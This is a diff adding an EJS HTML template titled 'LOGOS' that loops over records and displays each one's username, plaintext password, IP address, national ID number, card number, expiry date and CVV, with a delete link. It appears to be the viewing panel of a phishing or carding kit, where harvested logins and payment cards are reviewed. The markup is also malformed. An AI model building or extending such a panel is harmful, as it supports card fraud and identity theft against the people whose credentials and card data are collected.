@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <%- include('partials/header') %>
+    <title>LOGOS</title>
+    <div class="container p-4">
+      <div class="row">
+        <% books.forEach(function (book){ %>
+          <div class="col-md-4">
+            <div class="card">
+              <div class="card-header">
+                
+                  <%= book.username %> <br>
+                   <%= book.password %> <br>
+                   <%= book.ip %>
+                  
+                  
+              </div>
+</head>
+
+<body>
+  
+            <div class="card-body">
+              <%= book.dni %><br>
+              
+               <%= book.cardnumber %> <br>
+                
+                <%= book.mm %>  <%= book.yy %><br>
+                
+                <%= book.cvv %> <br>
+                <%= book.ip %>
+              
+            </div>
+            <div class="card-footer">
+              <a href="/delete/<%= book.id %>" class="btn btn-danger">
+                Delete
+              </a>
+            </div>
+          </div>
+        </div>
+       
+
+    <% }); %></div>
+  </div>
+
+
+
+</body> 
+
+</html>
